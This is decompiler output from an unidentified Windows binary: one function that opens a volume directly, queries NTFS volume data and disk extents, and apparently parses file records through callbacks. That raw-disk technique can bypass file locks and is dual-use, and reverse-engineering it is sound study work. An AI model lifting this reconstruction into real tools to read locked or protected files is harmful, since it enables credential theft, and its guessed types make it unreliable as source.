BOOL __fastcall sub_404BE0(PCWSTR pszStart, int a2, int a3)
{
  PWSTR v4; // edi
  PWSTR v5; // eax
  const unsigned __int16 *v6; // esi
  PWSTR v7; // eax
  int v9; // ecx
  HANDLE ProcessHeap; // eax
  WCHAR *v11; // eax
  const WCHAR *v12; // esi
  HANDLE FileW; // eax
  HANDLE v14; // esi
  const WCHAR *v15; // edi
  HANDLE v16; // eax
  void *v17; // eax
  HANDLE v18; // eax
  unsigned int *v19; // edi
  BOOL v20; // eax
  HANDLE v21; // eax
  void (__stdcall *v22)(HANDLE, DWORD, LPVOID); // edi
  unsigned int v23; // ecx
  HANDLE v24; // eax
  int v25; // ecx
  int v26; // ecx
  int v27; // eax
  HANDLE v28; // eax
  void (__stdcall *v29)(HANDLE); // ecx
  HANDLE v30; // eax
  const WCHAR *v31; // [esp-8h] [ebp-FCh]
  SIZE_T v32; // [esp-4h] [ebp-F8h]
  size_t v33; // [esp-4h] [ebp-F8h]
  void *v34; // [esp-4h] [ebp-F8h]
  void *v35; // [esp-4h] [ebp-F8h]
  WCHAR *v36; // [esp-4h] [ebp-F8h]
  _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+10h] [ebp-E4h] BYREF
  _BYTE Src[40]; // [esp+44h] [ebp-B0h] BYREF
  DWORD BytesReturned; // [esp+6Ch] [ebp-88h] BYREF
  _BYTE v40[104]; // [esp+70h] [ebp-84h] BYREF
  LPCWSTR v41; // [esp+DCh] [ebp-18h] BYREF
  BOOL v42; // [esp+E0h] [ebp-14h]
  int v43; // [esp+E4h] [ebp-10h]
  LPCWSTR lpFileName; // [esp+E8h] [ebp-Ch]
  size_t Size; // [esp+ECh] [ebp-8h]
  int nFileIndexHigh_low; // [esp+FCh] [ebp+8h]

  v43 = a2;
  v42 = 0;
  memset(v40, 0, sizeof(v40));
  memset(&FileInformation, 0, sizeof(FileInformation));
  v4 = 0;
  v5 = StrChrW(pszStart, 0x3Au);
  if ( v5 )
    v6 = v5 - 1;
  else
    v6 = pszStart;
  if ( v43 )
  {
    v9 = wcslen(v6);
  }
  else
  {
    v7 = StrRChrW(v6, 0, 0x5Cu);
    if ( !v7 || v7 == v6 )
      return 0;
    v4 = v7 + 1;
    v9 = v7 + 1 - v6;
    if ( v9 != 3 )
      --v9;
  }
  Size = 2 * v9;
  *(_OWORD *)Src = xmmword_405860;
  v32 = 2 * v9 + 48;
  *(_OWORD *)&Src[16] = xmmword_405870;
  *(_QWORD *)&Src[32] = 0x4E004F0049LL;
  ProcessHeap = GetProcessHeap();
  v11 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, v32);
  lpFileName = v11;
  if ( v11 )
  {
    v33 = Size;
    *(_QWORD *)v11 = *(_QWORD *)L"\\\\?\\";
    v41 = v11 + 4;
    memcpy(v11 + 4, v6, v33);
    v12 = lpFileName;
    memcpy((char *)lpFileName + Size + 8, Src, 0x26u);
    FileW = CreateFileW(v12, 0x80000000, 1u, 0, 3u, 0x2000000u, 0);
    v14 = FileW;
    if ( !FileW || FileW == (HANDLE)-1 )
      v14 = CreateFileW(lpFileName, 0, 1u, 0, 3u, 0x2000000u, 0);
    if ( !v14 || v14 == (HANDLE)-1 )
      v14 = CreateFileW(v41, 0x80000000, 1u, 0, 3u, 0x2000000u, 0);
    if ( !v14 || v14 == (HANDLE)-1 )
    {
      v22 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
LABEL_43:
      v36 = (WCHAR *)lpFileName;
      v30 = GetProcessHeap();
      v22(v30, 0, v36);
      return v42;
    }
    if ( !GetFileInformationByHandle(v14, &FileInformation) )
      goto LABEL_36;
    *(_DWORD *)&v40[72] = a3;
    *(_DWORD *)&v40[52] = v4;
    v15 = lpFileName;
    *(_QWORD *)&v40[64] = 0LL;
    *(_DWORD *)&v40[44] = 2;
    *(_DWORD *)&v40[48] = 0;
    v31 = lpFileName;
    Size = FileInformation.nFileIndexLow;
    nFileIndexHigh_low = LOWORD(FileInformation.nFileIndexHigh);
    *(_QWORD *)lpFileName = *(_QWORD *)L"\\\\.\\";
    StrStrW(v31, &word_405888)[1] = 0;
    *(_DWORD *)&v40[40] = CreateFileW(v15, 0x80000000, 3u, 0, 3u, 0, 0);
    if ( *(_DWORD *)&v40[40] == -1 )
      goto LABEL_36;
    v16 = GetProcessHeap();
    v17 = HeapAlloc(v16, 8u, 0x80u);
    *(_DWORD *)&v40[76] = v17;
    if ( !v17 )
    {
      v22 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
LABEL_39:
      v29 = (void (__stdcall *)(HANDLE))CloseHandle;
      if ( *(_DWORD *)&v40[40] )
      {
        CloseHandle(*(HANDLE *)&v40[40]);
        v29 = (void (__stdcall *)(HANDLE))CloseHandle;
      }
      v29(v14);
      goto LABEL_43;
    }
    if ( DeviceIoControl(*(HANDLE *)&v40[40], 0x560000u, 0, 0, v17, 0x80u, (LPDWORD)&v41, 0)
      && (memset(v40, 0, 40), v18 = GetProcessHeap(), (v19 = (unsigned int *)HeapAlloc(v18, 0, 0x60u)) != 0) )
    {
      v20 = DeviceIoControl(*(HANDLE *)&v40[40], 0x90064u, 0, 0, v19, 0x60u, &BytesReturned, 0);
      v34 = v19;
      if ( v20
        && (*(_DWORD *)v40 = v19[12],
            *(_DWORD *)&v40[4] = *(_DWORD *)v40 + 15,
            *(_QWORD *)&v40[16] = *((_QWORD *)v19 + 2),
            *(_QWORD *)&v40[24] = v19[11],
            v23 = v19[10],
            (*(_DWORD *)&v40[36] = v23) != 0) )
      {
        *(_DWORD *)&v40[32] = v19[11] / v23;
        v24 = GetProcessHeap();
        v22 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
        HeapFree(v24, 0, v34);
        if ( *(_DWORD *)v40 && *(_QWORD *)&v40[24] && *(_DWORD *)&v40[32] )
        {
          sub_4044E0(Size, nFileIndexHigh_low, v25, (int)v40, (void (__stdcall *)(int, int))sub_404920);
          if ( v43 || (v27 = *(_DWORD *)&v40[56]) == 0 )
          {
            sub_4044E0(Size, nFileIndexHigh_low, v26, (int)v40, (void (__stdcall *)(int, int))sub_4049F0);
            v27 = *(_DWORD *)&v40[56];
          }
          v42 = v27 != 0;
        }
      }
      else
      {
        v21 = GetProcessHeap();
        v22 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
        HeapFree(v21, 0, v34);
      }
    }
    else
    {
LABEL_36:
      v22 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    }
    if ( *(_DWORD *)&v40[76] )
    {
      v35 = *(void **)&v40[76];
      v28 = GetProcessHeap();
      v22(v28, 0, v35);
    }
    goto LABEL_39;
  }
  return v42;
}
// 404F21: variable 'v25' is possibly undefined
// 404F4E: variable 'v26' is possibly undefined
// 4051F0: using guessed type wchar_t asc_4051F0[5];
// 405860: using guessed type __int128 xmmword_405860;
// 405870: using guessed type __int128 xmmword_405870;

// nfuncs=48 queued=45 decompiled=45 lumina nreq=0 worse=0 better=0
// ALL OK, 45 function(s) have been successfully decompiled
